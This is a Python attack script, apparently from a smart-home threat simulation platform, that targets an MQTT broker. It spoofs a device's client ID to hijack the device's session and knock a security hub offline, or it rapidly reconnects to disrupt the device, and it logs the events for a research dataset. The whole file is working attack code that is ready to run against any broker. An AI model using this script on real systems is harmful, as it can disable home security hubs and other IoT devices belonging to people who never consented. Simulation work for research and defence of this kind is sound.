import sys
import os
import paho.mqtt.client as mqtt
import time
import argparse
import json

# Ensure the project root is in the path for forensic_utils
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from forensic_utils import DualLogger, get_iso_now, get_timestamp

# Standardized Research Banners
BANNER = """
==================================================
  SOVEREIGNTY RESEARCH: CONNECTIVITY DISRUPTOR
==================================================
"""

# Configuration for standardized logging
BASE_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset"
LOG_DIR = os.path.join(BASE_DIR, "logs")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")

class HijackLogger:
    """Handles high-fidelity forensic logging of session hijacking and connectivity disruption events."""
    def __init__(self, target_id):
        self.timestamp = get_timestamp()
        self.base_name = f"outage_events_{self.timestamp}"
        self.headers = ["timestamp", "target_client_id", "event_type", "status", "latency_ms"]

    def log_event(self, target_id, event, status, latency=0):
        record = {
            "timestamp": get_iso_now(),
            "target_client_id": target_id,
            "event_type": event,
            "status": status,
            "latency_ms": round(latency * 1000, 2)
        }
        DualLogger.append_raw(record, LOG_DIR, self.base_name, headers=self.headers)

def silent_hijack(broker, port, target_id, duration, logger):
    """Performs a silent hijack by holding the connection to the target ID to evaluate LWT triggers."""
    print(f"🕵️  Initiating Research Hijack on {target_id}...")
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, target_id)
    start_time = time.time()
    try:
        client.connect(broker, port, 60)
        logger.log_event(target_id, "HIJACK_START", "SUCCESS")
        
        print(f"✅ Connection 'Stolen'. Target hub is now disconnected.")
        print(f"⏳ Monitoring LWT timeout for {duration} seconds...")
        
        client.loop_start()
        time.sleep(duration)
        client.loop_stop()
        
        client.disconnect()
        total_time = time.time() - start_time
        logger.log_event(target_id, "HIJACK_END", "COMPLETED", total_time)
        print(f"🏁 Sequence complete. Normal connectivity resumption expected.")
        
    except Exception as e:
        logger.log_event(target_id, "HIJACK_FAILED", str(e))
        print(f"❌ Error: {e}")

def flapping_attack(broker, port, target_id, count, interval, logger):
    """Rapidly cycles connections to evaluate broker resilience and reconnection logic."""
    print(f"🌪️ Starting CONNECTIVITY DISRUPTION (Interval: {interval}s)...")
    for i in range(count):
        print(f"\r[Cycle {i+1}/{count}] Disrupting {target_id}...", end="")
        try:
            client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, target_id)
            client.connect(broker, port, 5)
            logger.log_event(target_id, "DISRUPT_CONNECT", "SUCCESS")
            time.sleep(0.5) 
            client.disconnect()
            logger.log_event(target_id, "DISRUPT_DISCONNECT", "SUCCESS")
            time.sleep(max(0, interval - 0.5))
        except Exception as e:
            logger.log_event(target_id, "DISRUPT_ERROR", str(e))
    print("\n🏁 Disruption sequence complete.")

def main():
    parser = argparse.ArgumentParser(description="Advanced Connectivity Disruption Analysis")
    parser.add_argument("--target", default="shtsp_Security_Hub_01", help="Target Client ID")
    parser.add_argument("--broker", default="192.168.1.105", help="Broker IP")
    parser.add_argument("--port", type=int, default=1883, help="Broker Port")
    parser.add_argument("--mode", choices=["silent", "flapping"], default="silent", help="Analysis Mode")
    parser.add_argument("--duration", type=int, default=30, help="Hold duration (seconds)")
    parser.add_argument("--count", type=int, default=10, help="Cycles for flapping mode")
    parser.add_argument("--interval", type=float, default=2.0, help="Interval (seconds)")
    
    args = parser.parse_args()

    print(f"\n🚀 [ADVANCED OUTAGE SIMULATION START] 🚀")
    print(f"Targeting: {args.target} | Mode: {args.mode.upper()}")
    print("-" * 50)

    logger = HijackLogger(args.target)

    if args.mode == "silent":
        silent_hijack(args.broker, args.port, args.target, args.duration, logger)
    else:
        flapping_attack(args.broker, args.port, args.target, args.count, args.interval, logger)

    session_ts = get_timestamp()
    summary = {
        "timestamp": session_ts,
        "target_client_id": args.target,
        "mode": args.mode,
        "config": {
            "duration": args.duration if args.mode == "silent" else None,
            "cycles": args.count if args.mode == "flapping" else None,
            "interval": args.interval if args.mode == "flapping" else None
        },
        "audit_trace_base": logger.base_name
    }
    
    json_p, csv_p = DualLogger.log_session(summary, SESSIONS_DIR, f"outage_session_{session_ts}")

    print("-" * 50)
    print(f"📊 Event Trace Log  : {LOG_DIR}/{logger.base_name} (.json/.csv)")
    print(f"📊 Session Summary  : {json_p} (+.csv)")
    print("-" * 50)

if __name__ == "__main__":
    main()

if __name__ == "__main__":
    main()
